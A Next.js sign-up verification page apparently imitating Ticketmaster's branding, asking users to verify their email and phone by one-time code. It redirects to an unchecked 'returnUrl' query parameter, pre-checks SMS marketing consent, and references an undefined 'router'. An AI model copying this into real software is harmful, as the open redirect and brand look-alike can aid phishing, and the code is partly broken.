'use client';

import styled from 'styled-components';
import Link from 'next/link';
import { useSearchParams, useRouter } from 'next/navigation';
import { useState, useEffect, Suspense } from 'react';
import { sendVerificationCode, verifyCode } from '@/lib/auth/verification';


const PageWrapper = styled.main`
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #f5f5f5;
  
  @media (max-width: 720px) {
    background: white;
    align-items: stretch;
  }
`;

const AuthCard = styled.div`
  display: grid;
  grid-template-columns: 40% 60%;
  width: 100%;
  max-width: 1000px;
  height: 100vh;
  max-height: 800px;
  box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
  border-radius: 8px;
  overflow: hidden;
  background: white;
  
  @media (max-width: 720px) {
    grid-template-columns: 1fr;
    max-height: none;
    height: 100%;
    min-height: 100vh;
    border-radius: 0;
    box-shadow: none;
  }
`;

const LeftPanel = styled.div`
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  height: 100%;
  background-color: rgb(18, 18, 18);
  background-size: cover;
  padding: 0px 32px;
  hyphens: auto;
  
  @media (max-width: 900px) {
    display: none;
  }
`;

const ContentInfo = styled.div`
  display: flex;
  flex-direction: column;
  padding-top: 64px;
  gap: 8px;
`;

const TextRow = styled.div``;

const AlmostThereLabel = styled.span`
  font-size: 32px;
  font-weight: 700;
  color: white;
  text-transform: uppercase;
  line-height: 1.1;
`;

const WelcomeDescription = styled.span`
  font-size: 16px;
  line-height: 1.5;
  color: white;
  font-weight: 400;
`;

const LogoBottomImage = styled.img`
  width: 156px;
  height: auto;
  margin-bottom: 32px;
`;

const RightPanel = styled.div`
  background: #ffffff;
  padding: 60px 80px;
  display: flex;
  align-items: center;
  justify-content: center;
  
  @media (max-width: 900px) {
    padding: 40px 24px;
  }
`;

const ContentContainer = styled.div`
  width: 100%;
  max-width: 520px;
  padding: 20px 0;
`;

const RightTitle = styled.h2`
  font-size: 20px;
  font-weight: 800;
  color: #1f262d;
  margin: 0 0 16px 0;
  text-transform: uppercase;
  letter-spacing: 0.5px;
`;

const Subtitle = styled.p`
  font-size: 16px;
  color: #1f262d;
  margin: 0 0 32px 0;
  line-height: 1.5;
`;

const VerificationBox = styled.div`
  border: 1px solid #d1d5db;
  border-radius: 4px;
  padding: 24px;
  margin-bottom: 24px;
`;

const BoxHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 12px;
`;

const BoxTitle = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
  font-weight: 700;
  font-size: 16px;
  color: #1f262d;
  
  svg {
    width: 20px;
    height: 20px;
  }
`;

const RequiredBadge = styled.span`
  font-size: 11px;
  font-weight: 700;
  color: #6b7280;
  border: 1px solid #9ca3af;
  padding: 2px 6px;
  border-radius: 4px;
  text-transform: uppercase;
`;

const BoxText = styled.p`
  font-size: 14px;
  color: #1f262d;
  margin: 0 0 20px 0;
  line-height: 1.5;
`;

const ActionButton = styled.button`
  width: 100%;
  height: 48px;
  background: #026cdf;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  
  &:hover {
    background: #0052b0;
  }
`;

const HelpText = styled.p`
  font-size: 14px;
  color: #6b7280;
  margin-top: 32px;
  text-align: center;
  
  a {
    color: #026cdf;
    text-decoration: underline;
    font-weight: 600;
  }
`;

const CancelButton = styled.button`
  display: block;
  margin: 24px auto 0;
  background: none;
  border: none;
  color: #026cdf;
  font-weight: 600;
  font-size: 16px;
  cursor: pointer;
  
  &:hover {
    text-decoration: underline;
  }
`;

// MODAL COMPONENTS
const ModalOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
`;

const ModalContent = styled.div`
  background: white;
  padding: 32px;
  border-radius: 8px;
  width: 90%;
  max-width: 420px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.15);
`;

const ModalTitle = styled.h2`
  font-size: 24px;
  font-weight: 700;
  color: #1f262d;
  margin: 0 0 16px 0;
`;

const ModalText = styled.p`
  font-size: 15px;
  color: #1f262d;
  margin: 0 0 24px 0;
  line-height: 1.5;
`;

const InputLabel = styled.label`
  display: block;
  font-size: 14px;
  font-weight: 600;
  color: #1f262d;
  margin-bottom: 8px;
`;

const CodeInput = styled.input`
  width: 100%;
  height: 48px;
  padding: 0 16px;
  border: 2px solid #026cdf;
  border-radius: 4px;
  font-size: 18px;
  text-align: center;
  letter-spacing: 4px;
  
  &:focus {
    outline: none;
    border-color: #026cdf;
  }
`;

const ResendText = styled.p`
  font-size: 14px;
  color: #6b7280;
  margin: 16px 0 24px 0;
`;

const ModalButtonGroup = styled.div`
  display: flex;
  gap: 12px;
  justify-content: flex-end;
`;

const ModalCancelButton = styled.button`
  padding: 12px 24px;
  background: white;
  border: 1px solid #d1d5db;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 600;
  color: #1f262d;
  cursor: pointer;
  
  &:hover {
    background: #f5f5f5;
  }
`;

const ModalConfirmButton = styled.button`
  padding: 12px 24px;
  background: #026cdf;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 600;
  color: white;
  cursor: pointer;
  
  &:hover {
    background: #0052b0;
  }
  
  &:disabled {
    background: #9ca3af;
    cursor: not-allowed;
  }
`;

// Verified Box Styling - Green border for verified state
const VerifiedBox = styled.div`
  border: 2px solid #22c55e;
  border-radius: 4px;
  padding: 20px 24px;
  margin-bottom: 24px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: #f0fdf4;
`;

const VerifiedTitle = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
  font-weight: 600;
  font-size: 16px;
  color: #1f262d;
  
  svg {
    width: 20px;
    height: 20px;
  }
`;

const GreenCheck = styled.div`
  width: 24px;
  height: 24px;
  background: #22c55e;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  
  svg {
    width: 14px;
    height: 14px;
    color: white;
  }
`;

// Phone Modal Components
const PhoneInputContainer = styled.div`
  display: flex;
  border: 1px solid #d1d5db;
  border-radius: 4px;
  overflow: hidden;
  margin-bottom: 8px;
  
  &:focus-within {
    border-color: #026cdf;
    box-shadow: 0 0 0 2px rgba(2, 108, 223, 0.1);
  }
`;

const CountrySelector = styled.div`
  display: flex;
  align-items: center;
  padding: 0 12px;
  background: #f9fafb;
  border-right: 1px solid #d1d5db;
  cursor: pointer;
  gap: 6px;
  min-width: 90px;
  position: relative;
  
  &:hover {
    background: #f3f4f6;
  }
`;

const FlagIcon = styled.span`
  font-size: 20px;
`;

const CountryCode = styled.span`
  font-size: 14px;
  color: #1f262d;
  font-weight: 500;
`;

const DropdownArrow = styled.span`
  font-size: 10px;
  color: #6b7280;
`;

const CountryDropdown = styled.div`
  position: absolute;
  top: 100%;
  left: 0;
  background: white;
  border: 1px solid #d1d5db;
  border-radius: 4px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
  z-index: 10;
  min-width: 160px;
  margin-top: 4px;
`;

const CountryOption = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 12px 16px;
  cursor: pointer;
  font-size: 14px;
  
  &:hover {
    background: #f3f4f6;
  }
`;

const PhoneInput = styled.input`
  flex: 1;
  border: none;
  padding: 14px 16px;
  font-size: 16px;
  
  &:focus {
    outline: none;
  }
  
  &::placeholder {
    color: #9ca3af;
  }
`;

const ErrorMessage = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 8px;
  color: #dc2626;
  font-size: 14px;
  margin-bottom: 16px;
  line-height: 1.4;
  
  svg {
    width: 18px;
    height: 18px;
    flex-shrink: 0;
    margin-top: 2px;
  }
`;

const ConsentCheckbox = styled.label`
  display: flex;
  align-items: flex-start;
  gap: 12px;
  font-size: 14px;
  color: #374151;
  line-height: 1.5;
  cursor: pointer;
  margin-bottom: 24px;
  
  input {
    width: 18px;
    height: 18px;
    margin-top: 2px;
    accent-color: #026cdf;
  }
  
  a {
    color: #026cdf;
    text-decoration: underline;
  }
`;

// Wrapper component with Suspense boundary for useSearchParams
export default function SignUpPage() {
  return (
    <Suspense fallback={<PageWrapper><div>Loading...</div></PageWrapper>}>
      <SignUpPageContent />
    </Suspense>
  );
}

function SignUpPageContent() {
  const searchParams = useSearchParams();
  const email = searchParams.get('email') || 'your email';


  // Email verification state
  const [showEmailModal, setShowEmailModal] = useState(false);
  const [emailCode, setEmailCode] = useState('');
  const [emailVerified, setEmailVerified] = useState(false);
  const [resendTimer, setResendTimer] = useState(60);
  const [isVerifying, setIsVerifying] = useState(false);

  // Phone verification state
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [phoneStep, setPhoneStep] = useState<'input' | 'verify'>('input');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneCode, setPhoneCode] = useState('');
  const [phoneVerified, setPhoneVerified] = useState(false);
  const [phoneError, setPhoneError] = useState('');
  const [selectedCountry, setSelectedCountry] = useState<'US' | 'CA'>('US');
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [phoneResendTimer, setPhoneResendTimer] = useState(60);
  const [consent, setConsent] = useState(true);

  const countries = {
    US: { flag: '🇺🇸', code: '+1', name: 'United States' },
    CA: { flag: '🇨🇦', code: '+1', name: 'Canada' }
  };

  // Email resend timer countdown
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showEmailModal && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showEmailModal, resendTimer]);

  // Phone resend timer countdown
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (phoneStep === 'verify' && phoneResendTimer > 0) {
      interval = setInterval(() => {
        setPhoneResendTimer(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [phoneStep, phoneResendTimer]);

  const handleOpenEmailModal = async () => {
    setShowEmailModal(true);
    setEmailCode('');
    setResendTimer(60);

    // Send real verification code
    const result = await sendVerificationCode(email, 'email');
    if (!result.success) {
      alert('Failed to send verification code. Please try again.');
    }
  };

  const handleCloseEmailModal = () => {
    setShowEmailModal(false);
    setEmailCode('');
  };

  const handleConfirmCode = async () => {
    setIsVerifying(true);
    const result = await verifyCode(email, emailCode);

    if (result.success) {
      setEmailVerified(true);
      setShowEmailModal(false);
    } else {
      alert(result.error || 'Invalid verification code.');
    }
    setIsVerifying(false);
  };

  // Phone handlers
  const handleOpenPhoneModal = () => {
    setShowPhoneModal(true);
    setPhoneStep('input');
    setPhoneNumber('');
    setPhoneCode('');
    setPhoneError('');
    setConsent(true);
  };

  const handleClosePhoneModal = () => {
    setShowPhoneModal(false);
    setPhoneStep('input');
    setPhoneNumber('');
    setPhoneCode('');
    setPhoneError('');
  };

  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 3) return cleaned;
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
  };

  const validatePhoneNumber = (phone: string) => {
    const cleaned = phone.replace(/\D/g, '');
    // US/Canada phone numbers should be 10 digits
    return cleaned.length === 10;
  };

  const handleAddNumber = async () => {
    if (!validatePhoneNumber(phoneNumber)) {
      setPhoneError("The type of phone number you've entered in is not supported. Please try a mobile or landline phone number.");
      return;
    }

    setPhoneError('');
    setIsVerifying(true);

    const fullPhone = `${countries[selectedCountry].code}${phoneNumber.replace(/\D/g, '')}`;
    const result = await sendVerificationCode(fullPhone, 'phone');

    if (result.success) {
      setPhoneStep('verify');
      setPhoneResendTimer(60);
    } else {
      setPhoneError(result.error || 'Failed to send verification code.');
    }

    setIsVerifying(false);
  };

  const handleConfirmPhoneCode = async () => {
    setIsVerifying(true);
    const fullPhone = `${countries[selectedCountry].code}${phoneNumber.replace(/\D/g, '')}`;
    const result = await verifyCode(fullPhone, phoneCode);

    if (result.success) {
      setPhoneVerified(true);
      setShowPhoneModal(false);
      // Redirect to landing page (or returnUrl if present)
      const returnUrl = searchParams.get('returnUrl') || '/';
      router.push(returnUrl);
    } else {

      alert(result.error || 'Invalid verification code.');
    }

    setIsVerifying(false);
  };

  return (
    <PageWrapper>
      <AuthCard>
        <LeftPanel data-bdd="left-column">
          <ContentInfo role="contentinfo">
            <TextRow>
              <AlmostThereLabel>Almost<br />There</AlmostThereLabel>
            </TextRow>
            <TextRow>
              <WelcomeDescription>
                Just one more step before we can get you in the door (it's basically the digital equivalent to a friendly bouncer checking your ID).
              </WelcomeDescription>
            </TextRow>
            <TextRow />
          </ContentInfo>
          <LogoBottomImage
            src="/assets/ticketmaster-logo-white-small.bb30b12d.svg"
            alt="Ticketmaster logo"
          />
        </LeftPanel>

        <RightPanel>
          <ContentContainer>
            <RightTitle>VERIFY YOUR ACCOUNT</RightTitle>
            <Subtitle>
              To keep your account secure, we need to verify both your email and phone.
            </Subtitle>

            {/* Email Verification Box */}
            {emailVerified ? (
              <VerifiedBox>
                <VerifiedTitle>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                  Email Verified
                </VerifiedTitle>
                <GreenCheck>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                    <path d="M5 13l4 4L19 7" />
                  </svg>
                </GreenCheck>
              </VerifiedBox>
            ) : (
              <VerificationBox>
                <BoxHeader>
                  <BoxTitle>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                    Verify your email
                  </BoxTitle>
                  <RequiredBadge>REQUIRED</RequiredBadge>
                </BoxHeader>
                <BoxText>
                  To verify your email, we'll send you a one-time code.
                </BoxText>
                <ActionButton onClick={handleOpenEmailModal}>Verify My Email</ActionButton>
              </VerificationBox>
            )}

            {/* Phone Verification Box */}
            {phoneVerified ? (
              <VerifiedBox>
                <VerifiedTitle>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                    <line x1="12" y1="18" x2="12.01" y2="18"></line>
                  </svg>
                  Phone Number Verified
                </VerifiedTitle>
                <GreenCheck>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                    <path d="M5 13l4 4L19 7" />
                  </svg>
                </GreenCheck>
              </VerifiedBox>
            ) : (
              <VerificationBox>
                <BoxHeader>
                  <BoxTitle>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                      <line x1="12" y1="18" x2="12.01" y2="18"></line>
                    </svg>
                    Add & Verify Your Phone Number
                  </BoxTitle>
                  <RequiredBadge>REQUIRED</RequiredBadge>
                </BoxHeader>
                <BoxText>
                  To verify your phone number, we'll send you a one-time code.
                </BoxText>
                <ActionButton onClick={handleOpenPhoneModal}>Add My Phone</ActionButton>
              </VerificationBox>
            )}

            <HelpText>
              Visit our <a href="https://help.ticketmaster.com/s/article/How-do-I-contact-Customer-Service" target="_blank">Help Center</a> if you need assistance.
            </HelpText>

            <CancelButton onClick={() => window.location.href = '/auth/signin'}>
              Cancel
            </CancelButton>
          </ContentContainer>
        </RightPanel>
      </AuthCard>

      {/* Email Verification Modal */}
      {showEmailModal && (
        <ModalOverlay onClick={handleCloseEmailModal}>
          <ModalContent onClick={e => e.stopPropagation()}>
            <ModalTitle>Verify Your Email</ModalTitle>
            <ModalText>
              Please enter the code sent to <strong>{email}</strong>.
            </ModalText>

            <InputLabel htmlFor="code">One-Time Code</InputLabel>
            <CodeInput
              id="code"
              type="text"
              maxLength={6}
              placeholder=""
              value={emailCode}
              onChange={(e) => setEmailCode(e.target.value.replace(/\D/g, ''))}
              autoFocus
            />

            <ResendText>
              If you do not receive a code, try sending again in {resendTimer > 0 ? resendTimer : 0} seconds
            </ResendText>

            <ModalButtonGroup>
              <ModalCancelButton onClick={handleCloseEmailModal}>
                Cancel
              </ModalCancelButton>
              <ModalConfirmButton
                onClick={handleConfirmCode}
                disabled={emailCode.length < 4 || isVerifying}
              >
                {isVerifying ? 'Verifying...' : 'Confirm Code'}
              </ModalConfirmButton>
            </ModalButtonGroup>
          </ModalContent>
        </ModalOverlay>
      )}

      {/* Phone Verification Modal */}
      {showPhoneModal && (
        <ModalOverlay onClick={handleClosePhoneModal}>
          <ModalContent onClick={e => e.stopPropagation()}>
            {phoneStep === 'input' ? (
              <>
                <ModalTitle>Add Your Phone Number</ModalTitle>

                <InputLabel>Phone Number</InputLabel>
                <PhoneInputContainer>
                  <CountrySelector onClick={() => setShowCountryDropdown(!showCountryDropdown)}>
                    <FlagIcon>{countries[selectedCountry].flag}</FlagIcon>
                    <DropdownArrow>▼</DropdownArrow>
                    <CountryCode>{countries[selectedCountry].code}</CountryCode>

                    {showCountryDropdown && (
                      <CountryDropdown>
                        <CountryOption onClick={(e) => { e.stopPropagation(); setSelectedCountry('US'); setShowCountryDropdown(false); }}>
                          <FlagIcon>🇺🇸</FlagIcon> United States +1
                        </CountryOption>
                        <CountryOption onClick={(e) => { e.stopPropagation(); setSelectedCountry('CA'); setShowCountryDropdown(false); }}>
                          <FlagIcon>🇨🇦</FlagIcon> Canada +1
                        </CountryOption>
                      </CountryDropdown>
                    )}
                  </CountrySelector>
                  <PhoneInput
                    type="tel"
                    placeholder="(555) 555-5555"
                    value={formatPhoneNumber(phoneNumber)}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                    autoFocus
                  />
                </PhoneInputContainer>

                {phoneError && (
                  <ErrorMessage>
                    <svg viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                    </svg>
                    {phoneError}
                  </ErrorMessage>
                )}

                <ConsentCheckbox>
                  <input
                    type="checkbox"
                    checked={consent}
                    onChange={(e) => setConsent(e.target.checked)}
                  />
                  <span>
                    I consent to receive notifications about upcoming events and special offers via text messages. <strong>Applies to mobile numbers only.</strong> <a href="#">Privacy Policy</a>
                  </span>
                </ConsentCheckbox>

                <ModalButtonGroup>
                  <ModalCancelButton onClick={handleClosePhoneModal}>
                    Cancel
                  </ModalCancelButton>
                  <ModalConfirmButton onClick={handleAddNumber}>
                    Add Number
                  </ModalConfirmButton>
                </ModalButtonGroup>
              </>
            ) : (
              <>
                <ModalTitle>Verify Your Phone</ModalTitle>
                <ModalText>
                  Please enter the code sent to <strong>{countries[selectedCountry].code} {formatPhoneNumber(phoneNumber)}</strong>.
                </ModalText>

                <InputLabel htmlFor="phoneCode">One-Time Code</InputLabel>
                <CodeInput
                  id="phoneCode"
                  type="text"
                  maxLength={6}
                  placeholder=""
                  value={phoneCode}
                  onChange={(e) => setPhoneCode(e.target.value.replace(/\D/g, ''))}
                  autoFocus
                />

                <ResendText>
                  If you do not receive a code, try sending again in {phoneResendTimer > 0 ? phoneResendTimer : 0} seconds
                </ResendText>

                <ModalButtonGroup>
                  <ModalCancelButton onClick={handleClosePhoneModal}>
                    Cancel
                  </ModalCancelButton>
                  <ModalConfirmButton
                    onClick={handleConfirmPhoneCode}
                    disabled={phoneCode.length < 4 || isVerifying}
                  >
                    {isVerifying ? 'Verifying...' : 'Confirm Code'}
                  </ModalConfirmButton>
                </ModalButtonGroup>
              </>
            )}
          </ModalContent>
        </ModalOverlay>
      )}
    </PageWrapper>
  );
}
